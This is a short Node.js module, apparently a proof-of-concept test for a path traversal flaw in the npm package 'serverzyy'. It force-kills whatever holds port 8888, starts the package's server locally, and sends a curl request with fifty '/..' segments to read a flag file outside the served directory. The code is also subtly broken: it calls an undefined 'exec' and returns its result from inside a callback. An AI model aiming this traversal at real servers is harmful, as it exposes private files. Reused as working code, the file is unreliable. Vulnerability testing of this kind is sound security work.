const { execSync } = require("child_process");
const path = require("path");
const sleep = require("sleep");

function exploitFunction(payload) {
  const pathToFlag = path.resolve(__dirname, "../flag.html");
  const genstr = (n) => "/..".repeat(50) + pathToFlag;

  try {
    execSync("fuser -k 8888/tcp");
  } catch (e) {}

  let server = "node ./node_modules/serverzyy/index.js";
  let exe = exec(server, (error, stdout) => {});

  sleep.sleep(2);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr()}"`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(payload)) {  // Use the payload here
      out = true;
    }
    return { error, stdout, out };
  });
}

module.exports = { exploitFunction };